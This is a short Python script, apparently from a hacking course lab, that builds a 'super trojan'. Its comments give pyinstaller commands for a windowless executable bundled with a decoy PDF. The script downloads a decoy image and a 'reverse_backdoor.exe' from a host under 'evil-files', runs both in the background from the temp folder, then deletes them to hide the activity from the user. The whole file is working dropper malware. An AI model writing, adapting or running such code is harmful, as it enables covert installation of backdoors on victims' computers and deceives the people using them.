#!/usr/bin/env python

# create a super trojan (download and execute payload)
# wine /root/.wine/drive_c/Python.../pyinstaller.exe --onefile --noconsole download_and_execute.py
# python listener.py

# wine /root/.wine/drive_c/Python.../pyinstaller.exe --add-data "/root/Downloads/sample.pdf,."--onefile
# --noconsole download_and_execute.py


import requests
import subprocess
import os
import tempfile


def download(url):
    # download file from the url
    get_response = requests.get(url)
    # print(get_response.content)

    # on split l'url en list par les / et on recupère le dernier élément
    file_name = url.split("/")[-1]

    # writing on disk
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

# download
download("http://10.0.2.16/evil-files/car.jpg")
# execute in the background
subprocess.Popen("car.jpg", shell=True)

# download
download("http://10.0.2.16/evil-files/reverse_backdoor.exe")
# execute in the background
subprocess.Popen("reverse_backdoor.exe", shell=True)

# hide the action from the user
os.remove("car.jpg")
os.remove("reverse_backdoor.exe")

# C:\Python 27\python.exe download_execute_any_report.py
